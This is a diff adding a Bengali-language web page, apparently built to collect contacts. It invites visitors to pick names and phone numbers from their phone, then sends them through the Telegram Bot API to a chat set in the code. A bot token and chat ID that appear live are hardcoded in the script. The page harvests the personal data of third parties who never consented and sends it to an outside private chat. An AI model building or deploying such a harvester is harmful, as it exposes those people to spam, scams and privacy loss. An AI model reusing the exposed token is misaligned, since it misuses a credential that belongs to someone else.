@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact to Telegram Bot</title>
+    <style>
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #0088cc; color: white; border: none; border-radius: 8px; transition: 0.3s; width: 100%; }
+        button:hover { background-color: #006699; }
+        #status { margin-top: 20px; color: #555; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>কন্টাক্ট লিস্ট শেয়ার করুন</h2>
+    <p>নিচের বাটনে ক্লিক করে নাম্বারগুলো সিলেক্ট করুন</p>
+    <button id="shareBtn">কন্টাক্ট পাঠান</button>
+    <div id="status"></div>
+</div>
+
+<script>
+    // আপনার দেওয়া তথ্য এখানে বসানো হয়েছে
+    const BOT_TOKEN = '7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc'; 
+    const CHAT_ID = '5923885908';     
+
+    const btn = document.querySelector('#shareBtn');
+    const statusDiv = document.querySelector('#status');
+
+    btn.addEventListener('click', async () => {
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            const props = ['name', 'tel'];
+            const opts = { multiple: true };
+
+            try {
+                statusDiv.innerText = "কন্টাক্ট লিস্ট ওপেন হচ্ছে...";
+                const contacts = await navigator.contacts.select(props, opts);
+
+                if (contacts.length > 0) {
+                    statusDiv.innerText = "টেলিগ্রামে পাঠানো হচ্ছে...";
+                    sendToTelegram(contacts);
+                } else {
+                    statusDiv.innerText = "কোনো কন্টাক্ট সিলেক্ট করা হয়নি।";
+                }
+            } catch (err) {
+                statusDiv.innerText = "এরর: " + err.message;
+            }
+        } else {
+            statusDiv.innerText = "আপনার ব্রাউজারটি এটি সাপোর্ট করে না। দয়া করে অ্যান্ড্রয়েড ক্রোম ব্যবহার করুন।";
+        }
+    });
+
+    async function sendToTelegram(contacts) {
+        let message = "📱 **নতুন কন্টাক্ট লিস্ট পাওয়া গেছে:**\n\n";
+        
+        contacts.forEach((contact, index) => {
+            const name = contact.name ? contact.name[0] : "নাম নেই";
+            const phone = contact.tel ? contact.tel[0] : "নাম্বার নেই";
+            message += `${index + 1}. নাম: ${name}\nনাম্বার: ${phone}\n\n`;
+        });
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (response.ok) {
+                statusDiv.style.color = "green";
+                statusDiv.innerText = "✅ সফলভাবে সব নাম্বার পাঠানো হয়েছে!";
+            } else {
+                statusDiv.style.color = "red";
+                statusDiv.innerText = "❌ বোটের সাথে কানেক্ট হতে সমস্যা হচ্ছে।";
+            }
+        } catch (error) {
+            statusDiv.style.color = "red";
+            statusDiv.innerText = "❌ নেটওয়ার্ক এরর!";
+        }
+    }
+</script>
+
+</body>
+</html>
